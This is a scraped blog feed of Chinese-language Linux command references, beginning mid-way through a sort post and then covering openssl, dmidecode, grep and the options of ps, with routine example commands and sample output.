sort.txt AAA:BB:CC aaa:30:1.6 ccc:50:3.3 ddd:20:4.2 bbb:10:2.5 eee:40:5.4 eee:60:5.1 # 将 BB 列按照数字从小到大顺序排列： [root@mail text]# sort -nk 2 -t: sort.txt AAA:BB:CC bbb:10:2.5 ddd:20:4.2 aaa:30:1.6 eee:40:5.4 ccc:50:3.3 eee:60:5.1 # 将 CC 列数字从大到小顺序排列： # -n 是按照数字大小排序，-r 是以相反顺序，-k 是指定需要排序的栏位，-t 指定栏位分隔符为冒号 [root@mail text]# sort -nrk 3 -t: sort.txt eee:40:5.4 eee:60:5.1 ddd:20:4.2 ccc:50:3.3 bbb:10:2.5 aaa:30:1.6 AAA:BB:CC 关于-k选项的解读和例子： -k 选项深度解读： FStart.CStart Modifier,FEnd.CEnd Modifier -------Start--------,-------End-------- FStart.CStart 选项 , FEnd.CEnd 选项 这个语法格式可以被其中的逗号,分为两大部分，Start 部分和 End 部分。 Start 部分由三部分组成，其中的 Modifier 部分就是我们之前说过的选项部分； 我们重点说说Start部分的FStart和C.Start；C.Start是可以省略的，省略的话就表示从本域的开头部分开始。FStart.CStart，其中FStart就是表示使用的域，而CStart则表示在FStart域中从第几个字符开始算排序首字符。 同理，在 End 部分中，你可以设定FEnd.CEnd，如果你省略.CEnd或将它设定为 0，则表示结尾到本域的最后一个字符。 例子：从公司英文名称的第二个字母开始排序： $ sort -t ' ' -k 1.2 facebook.txt baidu 100 5000 sohu 100 4500 google 110 5000 guge 50 3000 解读：使用了-k 1.2，表示对第一个域的第二个字符开始到本域的最后一个字符为止的字符串进行排序。你会发现 baidu 因为第二个字母是 a 而名列榜首。sohu 和 google 第二个字符都是 o，但 sohu 的 h 在 google 的 o 前面，所以两者分别排在第二和第三。guge 只能屈居第四了。 例子：只针对公司英文名称的第二个字母进行排序，如果相同的按照员工工资进行降序排序： $ sort -t ' ' -k 1.2,1.2 -nrk 3,3 facebook.txt baidu 100 5000 google 110 5000 sohu 100 4500 guge 50 3000 解读：由于只对第二个字母进行排序，所以我们使用了-k 1.2,1.2的表示方式，表示我们只对第二个字母进行排序（如果你问我使用-k 1.2怎么不行？当然不行，因为你省略了 End 部分，这就意味着你将对从第二个字母起到本域最后一个字符为止的字符串进行排序）。 对员工工资进行排序，我们也使用了-k 3,3，这是最准确的表述，表示我们只对本域进行排序，因为如果你省略了后面的 3，就变成了我们对第 3 个域开始到最后一个域位置的内容进行排序了。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"sort","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/sort/","stats":{"text":"8 min read","time":443000,"words":1754,"minutes":8},"date":"2022-02-02 03:18:37","dateFormat":"2022-02-02"},{"content":"强大的安全套接字层密码库。 补充说明 OpenSSL 是一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及 SSL 协议，并提供丰富的应用程序供测试或其它目的使用。在 OpenSSL 被曝出现严重安全漏洞后，发现多数通过 SSL 协议加密的网站使用名为 OpenSSL 的开源软件包。由于这是互联网应用最广泛的安全传输方法，被网银、在线支付、电商网站、门户网站、电子邮件等重要网站广泛使用，所以该漏洞影响范围广大。 OpenSSL 有两种运行模式：交互模式和批处理模式。 直接输入 openssl 回车进入交互模式，输入带命令选项的 openssl 进入批处理模式。 OpenSSL 整个软件包大概可以分成三个主要的功能部分：密码算法库、SSL 协议库以及应用程序。 OpenSSL 的目录结构自然也是围绕这三个功能部分进行规划的。 对称加密算法 OpenSSL 一共提供了 8 种对称加密算法，其中 7 种是分组加密算法，仅有的一种流加密算法是 RC4。这 7 种分组加密算法分别是 AES、DES、Blowfish、CAST、IDEA、RC2、RC5，都支持电子密码本模式（ECB）、加密分组链接模式（CBC）、加密反馈模式（CFB）和输出反馈模式（OFB）四种常用的分组密码加密模式。其中，AES 使用的加密反馈模式（CFB）和输出反馈模式（OFB）分组长度是 128 位，其它算法使用的则是 64 位。事实上，DES 算法里面不仅仅是常用的 DES 算法，还支持三个密钥和两个密钥 3DES 算法。 非对称加密算法 OpenSSL 一共实现了 4 种非对称加密算法，包括 DH 算法、RSA 算法、DSA 算法和椭圆曲线算法（EC）。DH 算法一般用户密钥交换。RSA 算法既可以用于密钥交换，也可以用于数字签名，当然，如果你能够忍受其缓慢的速度，那么也可以用于数据加密。DSA 算法则一般只用于数字签名。 信息摘要算法 OpenSSL 实现了 5 种信息摘要算法，分别是 MD2、MD5、MDC2、SHA（SHA1）和 RIPEMD。SHA 算法事实上包括了 SHA 和 SHA1 两种信息摘要算法，此外，OpenSSL 还实现了 DSS 标准中规定的两种信息摘要算法 DSS 和 DSS1。 密钥和证书管理 密钥和证书管理是 PKI 的一个重要组成部分，OpenSSL 为之提供了丰富的功能，支持多种标准。 首先，OpenSSL 实现了 ASN.1 的证书和密钥相关标准，提供了对证书、公钥、私钥、证书请求以及 CRL 等数据对象的 DER、PEM 和 BASE64 的编解码功能。OpenSSL 提供了产生各种公开密钥对和对称密钥的方法、函数和应用程序，同时提供了对公钥和私钥的 DER 编解码功能。并实现了私钥的 PKCS#12 和 PKCS#8 的编解码功能。OpenSSL 在标准中提供了对私钥的加密保护功能，使得密钥可以安全地进行存储和分发。 在此基础上，OpenSSL 实现了对证书的 X.509 标准编解码、PKCS#12 格式的编解码以及 PKCS#7 的编解码功能。并提供了一种文本数据库，支持证书的管理功能，包括证书密钥产生、请求产生、证书签发、吊销和验证等功能。 事实上，OpenSSL 提供的 CA 应用程序就是一个小型的证书管理中心（CA），实现了证书签发的整个流程和证书管理的大部分机制。 实例 1、使用 openssl 生成密码 几乎所有 Linux 发行版都包含 openssl。我们可以利用它的随机功能来生成可以用作密码的随机字母字符串。 openssl rand -base64 10# nU9LlHO5nsuUvw== nU9LlHO5nsuUvw== 2、消息摘要算法应用例子 用 SHA1 算法计算文件 file.txt 的哈西值，输出到 stdout： # openssl dgst -sha1 file.txt 用 SHA1 算法计算文件 file.txt 的哈西值，输出到文件 digest.txt： # openssl sha1 -out digest.txt file.txt 用 DSS1(SHA1) 算法为文件 file.txt 签名，输出到文件 dsasign.bin。签名的 private key 必须为 DSA 算法产生的，保存在文件 dsakey.pem 中。 # openssl dgst -dss1 -sign dsakey.pem -out dsasign.bin file.txt 用 dss1 算法验证 file.txt 的数字签名 dsasign.bin，验证的 private key 为 DSA 算法产生的文件 dsakey.pem。 # openssl dgst -dss1 -prverify dsakey.pem -signature dsasign.bin file.txt 用 sha1 算法为文件 file.txt 签名,输出到文件 rsasign.bin，签名的 private key 为 RSA 算法产生的文件 rsaprivate.pem。 # openssl sha1 -sign rsaprivate.pem -out rsasign.bin file.txt 用 sha1 算法验证 file.txt 的数字签名 rsasign.bin，验证的 public key 为 RSA 算法生成的 rsapublic.pem。 # openssl sha1 -verify rsapublic.pem -signature rsasign.bin file.txt 3、对称加密应用例子 对称加密应用例子，用 DES3 算法的 CBC 模式加密文件 plaintext.doc，加密结果输出到文件 ciphertext.bin。 # openssl enc -des3 -salt -in plaintext.doc -out ciphertext.bin 用 DES3 算法的 OFB 模式解密文件 ciphertext.bin，提供的口令为 trousers，输出到文件 plaintext.doc。注意：因为模式不同，该命令不能对以上的文件进行解密。 # openssl enc -des-ede3-ofb -d -in ciphertext.bin -out plaintext.doc -pass pass:trousers 用 Blowfish 的 CFB 模式加密 plaintext.doc，口令从环境变量 PASSWORD 中取，输出到文件 ciphertext.bin。 # openssl bf-cfb -salt -in plaintext.doc -out ciphertext.bin -pass env:PASSWORD 给文件 ciphertext.bin 用 base64 编码，输出到文件 base64.txt。 # openssl base64 -in ciphertext.bin -out base64.txt 用 RC5 算法的 CBC 模式加密文件 plaintext.doc，输出到文件 ciphertext.bin，salt、key 和初始化向量 (iv) 在命令行指定。 # openssl rc5 -in plaintext.doc -out ciphertext.bin -S C62CB1D49F158ADC -iv E9EDACA1BD7090C6 -K 89D4B1678D604FAA3DBFFD030A314B29 4、Diffie-Hellman 应用例子 使用生成因子 2 和随机的 1024-bit 的素数产生 D0ffie-Hellman 参数，输出保存到文件 dhparam.pem # openssl dhparam -out dhparam.pem -2 1024 从 dhparam.pem 中读取 Diffie-Hell 参数，以 C 代码的形式，输出到 stdout。 # openssl dhparam -in dhparam.pem -noout -C 5、DSA 应用例子应用例子 生成 1024 位 DSA 参数集，并输出到文件 dsaparam.pem。 # openssl dsaparam -out dsaparam.pem 1024 使用参数文件 dsaparam.pem 生成 DSA 私钥匙，采用 3DES 加密后输出到文件 dsaprivatekey.pem # openssl gendsa -out dsaprivatekey.pem -des3 dsaparam.pem 使用私钥匙 dsaprivatekey.pem 生成公钥匙，输出到 dsapublickey.pem # openssl dsa -in dsaprivatekey.pem -pubout -out dsapublickey.pem 从 dsaprivatekey.pem 中读取私钥匙，解密并输入新口令进行加密，然后写回文件 dsaprivatekey.pem # openssl dsa -in dsaprivatekey.pem -out dsaprivatekey.pem -des3 -passin 6、RSA 应用例子 产生 1024 位 RSA 私匙，用 3DES 加密它，口令为 trousers，输出到文件 rsaprivatekey.pem # openssl genrsa -out rsaprivatekey.pem -passout pass:trousers -des3 1024 从文件 rsaprivatekey.pem 读取私匙，用口令 trousers 解密，生成的公钥匙输出到文件 rsapublickey.pem # openssl rsa -in rsaprivatekey.pem -passin pass:trousers -pubout -out rsapubckey.pem 用公钥匙 rsapublickey.pem 加密文件 plain.txt，输出到文件 cipher.txt # openssl rsautl -encrypt -pubin -inkey rsapublickey.pem -in plain.txt -out cipher.txt 使用私钥匙 rsaprivatekey.pem 解密密文 cipher.txt，输出到文件 plain.txt # openssl rsautl -decrypt -inkey rsaprivatekey.pem -in cipher.txt -out plain.txt 用私钥匙 rsaprivatekey.pem 给文件 plain.txt 签名，输出到文件 signature.bin # openssl rsautl -sign -inkey rsaprivatekey.pem -in plain.txt -out signature.bin 用公钥匙 rsapublickey.pem 验证签名 signature.bin，输出到文件 plain.txt # openssl rsautl -verify -pubin -inkey rsapublickey.pem -in signature.bin -out plain 从 X.509 证书文件 cert.pem 中获取公钥匙，用 3DES 加密 mail.txt，输出到文件 mail.enc # openssl smime -encrypt -in mail.txt -des3 -out mail.enc cert.pem 从 X.509 证书文件 cert.pem 中获取接收人的公钥匙，用私钥匙 key.pem 解密 S/MIME 消息 mail.enc，结果输出到文件 mail.txt # openssl smime -decrypt -in mail.enc -recip cert.pem -inkey key.pem -out mail.txt cert.pem 为 X.509 证书文件，用私匙 key,pem 为 mail.txt 签名，证书被包含在 S/MIME 消息中，输出到文件 mail.sgn # openssl smime -sign -in mail.txt -signer cert.pem -inkey key.pem -out mail.sgn 验证 S/MIME 消息 mail.sgn，输出到文件 mail.txt，签名者的证书应该作为 S/MIME 消息的一部分包含在 mail.sgn 中 # openssl smime -verify -in mail.sgn -out mail.txt 更多实例: openssl version -a openssl help openssl genrsa -aes128 -out fd.key 2048 # pem format openssl rsa -text -in fd.key ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"openssl","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/openssl/","stats":{"text":"9 min read","time":531000,"words":2131,"minutes":9},"date":"2022-02-02 03:02:27","dateFormat":"2022-02-02"},{"content":"在 Linux 系统下获取有关硬件方面的信息。 补充说明 dmidecode 命令可以让你在 Linux 系统下获取有关硬件方面的信息。dmidecode 的作用是将 DMI 数据库中的信息解码，以可读的文本方式显示。由于 DMI 信息可以人为修改，因此里面的信息不一定是系统准确的信息。dmidecode 遵循 SMBIOS/DMI 标准，其输出的信息包括 BIOS、系统、主板、处理器、内存、缓存等等。 DMI（Desktop Management Interface,DMI）就是帮助收集电脑系统信息的管理系统，DMI 信息的收集必须在严格遵照 SMBIOS 规范的前提下进行。SMBIOS（System Management BIOS）是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS 和 DMI 是由行业指导机构 Desktop Management Task Force(DMTF) 起草的开放性的技术标准，其中 DMI 设计适用于任何的平台和操作系统。 DMI 充当了管理工具和系统层之间接口的角色。它建立了标准的可管理系统更加方便了电脑厂商和用户对系统的了解。DMI 的主要组成部分是 Management Information Format(MIF) 数据库。这个数据库包括了所有有关电脑系统和配件的信息。通过 DMI，用户可以获取序列号、电脑厂商、串口信息以及其它系统配件信息。 语法 dmidecode [选项 ] 选项 -d：(default:/dev/mem) 从设备文件读取信息，输出内容与不加参数标准输出相同。 -h：显示帮助信息。 -s：只显示指定 DMI 字符串的信息。(string) -t：只显示指定条目的信息。(type) -u：显示未解码的原始条目内容。 --dump-bin file：将 DMI 数据转储到一个二进制文件中。 --from-dump FILE：从一个二进制文件读取 DMI 数据。 -V：显示版本信息。 dmidecode 参数 string 及 type 列表： （1）Valid string keywords are： bios-vendor bios-version bios-release-date system-manufacturer system-product-name system-version system-serial-number system-uuid baseboard-manufacturer baseboard-product-name baseboard-version baseboard-serial-number baseboard-asset-tag chassis-manufacturer chassis-type chassis-version chassis-serial-number chassis-asset-tag processor-family processor-manufacturer processor-version processor-frequency （2）Valid type keywords are： bios system baseboard chassis processor memory Cache connector slot （3）type 全部编码列表： BIOS System Base Board Chassis Processor Memory Controller Memory Module Cache Port Connector System Slots On Board Devices OEM Strings System Configuration Options BIOS Language Group Associations System Event Log Physical Memory Array Memory Device 32-bit Memory Error Memory Array Mapped Address Memory Device Mapped Address Built-in Pointing Device Portable Battery System Reset Hardware Security System Power Controls Voltage Probe Cooling Device Temperature Probe Electrical Current Probe Out-of-band Remote Access Boot Integrity Services System Boot 64-bit Memory Error Management Device Management Device Component Management Device Threshold Data Memory Channel IPMI Device Power Supply Additional Information Onboard Device 实例 dmidecode -t 1 # 查看服务器信息 dmidecode | grep 'Product Name' # 查看服务器型号 dmidecode |grep 'Serial Number' # 查看主板的序列号 dmidecode -t 2 # 查看主板信息 dmidecode -s system-serial-number # 查看系统序列号 dmidecode -t memory # 查看内存信息 dmidecode -t 11 # 查看 OEM 信息 dmidecode -t 17 # 查看内存条数 dmidecode -t 16 # 查询内存信息 dmidecode -t 4 # 查看 CPU 信息 cat /proc/scsi/scsi # 查看服务器硬盘信息 不带选项执行 dmidecode 命令通常会输出所有的硬件信息。dmidecode 命令有个很有用的选项-t，可以按指定类型输出相关信息，假如要获得处理器方面的信息，则可以执行： [root@localhost ~]# dmidecode -t processor # dmidecode 2.11 SMBIOS 2.5 present. Handle 0x0001, DMI type 4, 40 bytes Processor Information Socket Designation: Node 1 Socket 1 Type: Central Processor Family: Xeon MP Manufacturer: Intel(R) Corporation id: C2 06 02 00 FF FB EB BF Signature: Type 0, Family 6, Model 44, Stepping 2 Flags: FPU (Floating-point unit on-chip) VME (Virtual mode extension) DE (Debugging extension) PSE (Page size extension) TSC (time stamp counter) MSR (Model specific registers) PAE (Physical address extension) MCE (Machine check exception) CX8 (CMPXCHG8 instruction supported) APIC (On-chip APIC hardware supported) SEP (Fast system call) MTRR (Memory type range registers) PGE (Page global enable) MCA (Machine check architecture) CMOV (Conditional move instruction supported) PAT (Page attribute table) PSE-36 (36-bit page size extension) CLFSH (CLFLUSH instruction supported) DS (Debug store) ACPI (ACPI supported) MMX (MMX technology supported) FXSR (FXSAVE and FXSTOR instructions supported) SSE (Streaming SIMD extensions) SSE2 (Streaming SIMD extensions 2) ss (Self-snoop) HTT (Multi-threading) TM (Thermal monitor supported) PBE (Pending break enabled) Version: Intel(R) Xeon(R) CPU E5620 @ 2.40GHz Voltage: 1.2 V External Clock: 5866 MHz Max Speed: 4400 MHz Current Speed: 2400 MHz Status: Populated, Enabled Upgrade: ZIF Socket L1 Cache Handle: 0x0002 L2 Cache Handle: 0x0003 L3 Cache Handle: 0x0004 Serial Number: Not Specified Asset Tag: Not Specified Part Number: Not Specified Core Count: 4 Core Enabled: 4 Thread Count: 8 Characteristics: 64-bit capable Handle 0x0055, DMI type 4, 40 bytes Processor Information Socket Designation: Node 1 Socket 2 Type: Central Processor Family: Xeon MP Manufacturer: Not Specified ID: 00 00 00 00 00 00 00 00 Signature: Type 0, Family 0, Model 0, Stepping 0 Flags: None Version: Not Specified Voltage: 1.2 V External Clock: 5866 MHz Max Speed: 4400 MHz Current Speed: Unknown Status: Unpopulated Upgrade: ZIF Socket L1 Cache Handle: Not Provided L2 Cache Handle: Not Provided L3 Cache Handle: Not Provided Serial Number: Not Specified Asset Tag: Not Specified Part Number: Not Specified Characteristics: None 查看内存的插槽数，已经使用多少插槽。每条内存多大，已使用内存多大 dmidecode|grep -P -A5 &quot;Memory\\s+Device&quot;|grep Size|grep -v Range # Size: 2048 MB # Size: 2048 MB # Size: 4096 MB # Size: No Module Installed 查看内存支持的最大内存容量 dmidecode|grep -P 'Maximum\\s+Capacity' # Maximum Capacity: 16 GB 查看内存的频率 dmidecode|grep -A16 &quot;Memory Device&quot; # Memory Device # Array Handle: 0x1000 # Error Information Handle: Not Provided # Total Width: 72 bits # Data Width: 64 bits # Size: 2048 MB # Form Factor: DIMM # Set: 1 # Locator: DIMM_A1 # Bank Locator: Not Specified # Type: DDR3 # Type Detail: Synchronous Unbuffered (Unregistered) # Speed: 1333 MHz # Manufacturer: 00CE000080CE # Serial Number: 4830F3E1 # Asset Tag: 01093200 # Part Number: M391B5673EH1-CH9 # -- # Memory Device # Array Handle: 0x1000 # Error Information Handle: Not Provided # Total Width: 72 bits # Data Width: 64 bits # Size: 2048 MB # Form Factor: DIMM # Set: 1 # Locator: DIMM_A2 # Bank Locator: Not Specified # Type: DDR3 # Type Detail: Synchronous Unbuffered (Unregistered) # Speed: 1333 MHz # Manufacturer: 00AD000080AD # Serial Number: 1BA1F0B5 # Asset Tag: 01110900 # Part Number: HMT325U7BFR8C-H9 # -- dmidecode|grep -A16 &quot;Memory Device&quot;|grep 'Speed' # Speed: 1333 MHz # Speed: 1333 MHz # Speed: 1333 MHz # Speed: Unknown ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"dmidecode","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/dmidecode/","stats":{"text":"8 min read","time":421000,"words":1415,"minutes":8},"date":"2022-02-02 02:59:34","dateFormat":"2022-02-02"},{"content":"强大的文本搜索工具。 补充说明 grep （global search regular expression(RE) and print out the line，全面搜索 正则表达式 并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。用于过滤/搜索的特定字符。可使用正则表达式能配合多种命令使用，使用上十分灵活。 选项 -a --text # 不要忽略二进制数据。 -A &lt;显示行数&gt; --after-context=&lt;显示行数&gt; # 除了显示符合范本样式的那一行之外，并显示该行之后的内容。 -b --byte-offset # 在显示符合范本样式的那一行之外，并显示该行之前的内容。 -B&lt;显示行数&gt; --before-context=&lt;显示行数&gt; # 除了显示符合样式的那一行之外，并显示该行之前的内容。 -c --count # 计算符合范本样式的列数。 -C&lt;显示行数&gt; --context=&lt;显示行数&gt;或-&lt;显示行数&gt; # 除了显示符合范本样式的那一列之外，并显示该列之前后的内容。 -d&lt;进行动作&gt; --directories=&lt;动作&gt; # 当指定要查找的是目录而非文件时，必须使用这项参数，否则 grep 命令将回报信息并停止动作。 -e&lt;范本样式&gt; --regexp=&lt;范本样式&gt; # 指定字符串作为查找文件内容的范本样式。 -E --extended-regexp # 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。 -f&lt;范本文件&gt; --file=&lt;规则文件&gt; # 指定范本文件，其内容有一个或多个范本样式，让 grep 查找符合范本条件的文件内容，格式为每一列的范本样式。 -F --fixed-regexp # 将范本样式视为固定字符串的列表。 -G --basic-regexp # 将范本样式视为普通的表示法来使用。 -h --no-filename # 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。 -H --with-filename # 在显示符合范本样式的那一列之前，标示该列的文件名称。 -i --ignore-case # 忽略字符大小写的差别。 -l --file-with-matches # 列出文件内容符合指定的范本样式的文件名称。 -L --files-without-match # 列出文件内容不符合指定的范本样式的文件名称。 -n --line-number # 在显示符合范本样式的那一列之前，标示出该列的编号。 -P --perl-regexp # PATTERN 是一个 Perl 正则表达式 -q --quiet 或--silent # 不显示任何信息。 -R/-r --recursive # 此参数的效果和指定“-d recurse”参数相同。 -s --no-messages # 不显示错误信息。 -v --revert-match # 反转查找。 -V --version # 显示版本信息。 -w --word-regexp # 只显示全字符合的列。 -x --line-regexp # 只显示全列符合的列。 -y # 此参数效果跟“-i”相同。 -o # 只输出文件中匹配到的部分。 -m &lt;num&gt; --max-count=&lt;num&gt; # 找到 num 行结果后停止查找，用来限制匹配行数 规则表达式 ^ # 锚定行的开始 如：'^grep' 匹配所有以 grep 开头的行。 $ # 锚定行的结束 如：'grep$' 匹配所有以 grep 结尾的行。 . # 匹配一个非换行符的字符 如：'gr.p' 匹配 gr 后接一个任意字符，然后是 p。 * # 匹配零个或多个先前字符 如：'*grep' 匹配所有一个或多个空格后紧跟 grep 的行。 .* # 一起用代表任意字符。 [] # 匹配一个指定范围内的字符，如 '[Gg]rep' 匹配 Grep 和 grep。 [^] # 匹配一个不在指定范围内的字符，如：'[^A-FH-Z]rep' 匹配不包含 A-R 和 T-Z 的一个字母开头，紧跟 rep 的行。 \\(..\\) # 标记匹配字符，如 '\\(love\\)'，love 被标记为 1。 \\&lt; # 锚定单词的开始，如:'\\&lt;grep' 匹配包含以 grep 开头的单词的行。 \\&gt; # 锚定单词的结束，如 'grep\\&gt;' 匹配包含以 grep 结尾的单词的行。 x\\{m\\} # 重复字符 x，m 次，如：'0\\{5\\}' 匹配包含 5 个 o 的行。 x\\{m,\\} # 重复字符 x,至少 m 次，如：'o\\{5,\\}' 匹配至少有 5 个 o 的行。 x\\{m,n\\} # 重复字符 x，至少 m 次，不多于 n 次，如：'o\\{5,10\\}' 匹配 5--10 个 o 的行。 \\w # 匹配文字和数字字符，也就是[A-Za-z0-9]，如：'G\\w*p' 匹配以 G 后跟零个或多个文字或数字字符，然后是 p。 \\W # \\w 的反置形式，匹配一个或多个非单词字符，如点号句号等。 \\b # 单词锁定符，如: '\\bgrep\\b' 只匹配 grep。 grep 命令常见用法 在文件中搜索一个单词，命令会返回一个包含 “match_pattern” 的文本行： grep match_pattern file_name grep &quot;match_pattern&quot; file_name 在多个文件中查找： grep &quot;match_pattern&quot; file_1 file_2 file_3 ... 输出除之外的所有行 -v 选项： grep -v &quot;match_pattern&quot; file_name 标记匹配颜色 --color=auto 选项： grep &quot;match_pattern&quot; file_name --color=auto 使用正则表达式 -E 选项： grep -E &quot;[1-9]+&quot; # 或 egrep &quot;[1-9]+&quot; 使用正则表达式 -P 选项： grep -P &quot;(\\d{3}\\-){2}\\d{4}&quot; file_name 只输出文件中匹配到的部分 -o 选项： echo this is a test line. | grep -o -E &quot;[a-z]+\\.&quot; line. echo this is a test line. | egrep -o &quot;[a-z]+\\.&quot; line. 统计文件或者文本中包含匹配字符串的行数 -c 选项： grep -c &quot;text&quot; file_name 输出包含匹配字符串的行数 -n 选项： grep &quot;text&quot; -n file_name # 或 cat file_name | grep &quot;text&quot; -n #多个文件 grep &quot;text&quot; -n file_1 file_2 打印样式匹配所位于的字符或字节偏移： echo gun is not unix | grep -b -o &quot;not&quot; 7:not #一行中字符串的字符便宜是从该行的第一个字符开始计算，起始值为 0。选项 **-b -o** 一般总是配合使用。 搜索多个文件并查找匹配文本在哪些文件中： grep -l &quot;text&quot; file1 file2 file3... grep 递归搜索文件 在多级目录中对文本进行递归搜索： grep &quot;text&quot; . -r -n # .表示当前目录。 忽略匹配样式中的字符大小写： echo &quot;hello world&quot; | grep -i &quot;HELLO&quot; # hello 选项 -e 制动多个匹配样式： echo this is a text line | grep -e &quot;is&quot; -e &quot;line&quot; -o is line #也可以使用 **-f** 选项来匹配多个样式，在样式文件中逐行写出需要匹配的字符。 cat patfile aaa bbb echo aaa bbb ccc ddd eee | grep -f patfile -o 在 grep 搜索结果中包括或者排除指定文件： # 只在目录中所有的.php 和.html 文件中递归搜索字符&quot;main()&quot; grep &quot;main()&quot; . -r --include *.{php,html} # 在搜索结果中排除所有 README 文件 grep &quot;main()&quot; . -r --exclude &quot;README&quot; # 在搜索结果中排除 filelist 文件列表里的文件 grep &quot;main()&quot; . -r --exclude-from filelist 使用 0 值字节后缀的 grep 与 xargs： # 测试文件： echo &quot;aaa&quot; &gt; file1 echo &quot;bbb&quot; &gt; file2 echo &quot;aaa&quot; &gt; file3 grep &quot;aaa&quot; file* -lZ | xargs -0 rm # 执行后会删除 file1 和 file3，grep 输出用-Z 选项来指定以 0 值字节作为终结符文件名（\\0），xargs -0 读取输入并用 0 值字节终结符分隔文件名，然后删除匹配文件，-Z 通常和-l 结合使用。 grep 静默输出： grep -q &quot;test&quot; filename # 不会输出任何信息，如果命令运行成功返回 0，失败则返回非 0 值。一般用于条件测试。 打印出匹配文本之前或者之后的行： # 显示匹配某个结果之后的 3 行，使用 -A 选项： seq 10 | grep &quot;5&quot; -A 3 5 6 7 8 # 显示匹配某个结果之前的 3 行，使用 -B 选项： seq 10 | grep &quot;5&quot; -B 3 2 3 4 5 # 显示匹配某个结果的前三行和后三行，使用 -C 选项： seq 10 | grep &quot;5&quot; -C 3 2 3 4 5 6 7 8 # 如果匹配结果有多个，会用“--”作为各匹配结果之间的分隔符： echo -e &quot;a&lt;span title=&quot;\\n&quot;&gt;\\nb&lt;span title=&quot;\\n&quot;&gt;\\nc&lt;span title=&quot;\\n&quot;&gt;\\na&lt;span title=&quot;\\n&quot;&gt;\\nb&lt;span title=&quot;\\n&quot;&gt;\\nc&quot; | grep a -A 1 a b -- a b ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"grep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/grep/","stats":{"text":"9 min read","time":519000,"words":2094,"minutes":9},"date":"2022-02-02 02:58:39","dateFormat":"2022-02-02"},{"content":"报告当前系统的进程状态。 补充说明 ps 命令用于报告当前系统的进程状态。可以搭配 kill 指令随时中断、删除不必要的程序。ps 命令是最基本同时也是非常强大的进程查看命令，使用该命令可以确定有哪些进程正在运行和运行的状态、进程是否结束、进程有没有僵死、哪些进程占用了过多的资源等等，总之大部分信息都是可以通过执行该命令得到的。 语法 ps (选项) 选项 -a：显示所有终端机下执行的程序，除了阶段作业领导者之外。 a：显示现行终端机下的所有程序，包括其他用户的程序。 -A：显示所有程序。 -c：显示 CLS 和 PRI 栏位。 c：列出程序时，显示每个程序真正的指令名称，而不包含路径，选项或常驻服务的标示。 -C&lt;指令名称&gt;：指定执行指令的名称，并列出该指令的程序的状况。 -d：显示所有程序，但不包括阶段作业领导者的程序。 -e：此选项的效果和指定&quot;A&quot;选项相同。 e：列出程序时，显示每个程序所使用的环境变量。 -f：显示 UID,PPIP,C 与 STIME 栏位。 f：用 ASCII 字符显示树状结构，表达程序间的相互关系。 -g&lt;群组名称&gt;：此选项的效果和指定&quot;-G&quot;选项相同，当亦能使用阶段作业领导者的名称来指定。 g：显示现行终端机下的所有程序，包括群组领导者的程序。 -G&lt;群组识别码&gt;：列出属于该群组的程序的状况，也可使用群组名称来指定。 h：不显示标题列。 -H：显示树状结构，表示程序间的相互关系。 -j 或 j：采用工作控制的格式显示程序状况。 -l 或 l：采用详细的格式来显示程序状况。 L：列出栏位的相关信息。 -m 或 m：显示所有的执行绪。 n：以数字来表示 USER 和 WCHAN 栏位。 -N：显示所有的程序，除了执行 ps 指令终端机下的程序之外。 -p&lt;程序识别码&gt;：指定程序识别码，并列出该程序的状况。 p&lt;程序识别码&gt;：此选项的效果和指定&quot;-p&quot;选项相同，只在列表格式方面稍有差异。 r：只列出现行终端机正在执行中的程序。 -s&lt;阶段作业&gt;：指定阶段作业的程序识别码，并列出隶属该阶段作业的程序的状况。 s：采用程序信号的格式显示程序状况。 S：列出程序时，包括已中断的子程序资料。 -t&lt;终端机编号&gt;：指定终端机编号，并列出属于该终端机的程序的状况。 t&lt;终端机编号&gt;：此选项的效果和指定&quot;-t&quot;选项相同，只在列表格式方面稍有差异。 -T：显示现行终端机下的所有程序。 -u&lt;用户识别码&gt;：此选项的效果和指定&quot;-U&quot;选项相同。 u：以用户为主的格式来显示程序状况。 -U&lt;用户识别码&gt;：列出属于该用户的程序的状况，也可使用用户名称来指定。 U&lt;用户名称&gt;：列出属于该用户的程序的状况。 v：采用虚拟内存的格式显示程序状况。 -V 或 V：显示版本信息。 -w 或 w：采用宽阔的格式来显示程序状况。 x：显示所有程序，不以终端机来区分。 X：采用旧式的 Linux i386 登陆格式显示程序状况。 -y：配合选项&quot;-l&quot;使用时，不显示 F(flag) 栏位，并以 RSS 栏位取代 ADDR 栏位 。 -&lt;程序识别码&gt;：此选项的效果和指定&quot;p&quot;选项相同。 --cols&lt;每列字符数&gt;：设置每列的最大字符数。 --columns&lt;每列字符数&gt;：此选项的效果和指定&quot;--cols&quot;选项相同。 --cumulative：此选项的效果和指定&quot;S&quot;选项相同。 --deselect：此选项的效果和指定&quot;-N&quot;选项相同。 --forest：此选项的效果和指定&quot;f&quot;选项相同。 --headers：重复显示标题列。 --help：在线帮助。 --info：显示排错信息。 --lines&lt;显示列数&gt;：设置显示画面的列数。 --no-headers：此选项的效果和指定&quot;h&quot;选项相同，只在列表格式方面稍有差异。 --group&lt;群组名称&gt;：此选项的效果和指定&quot;-G&quot;选项相同。 --Group&lt;群组识别码&gt;：此选项的效果和指定&quot;-G&quot;选项相同。 --pid&lt;程序识别码&gt;：此选项的效果和指定&quot;-p&quot;选项相同。 --rows&lt;显示列数&gt;：此选项的效果和指定&quot;--lines&quot;选项相同。 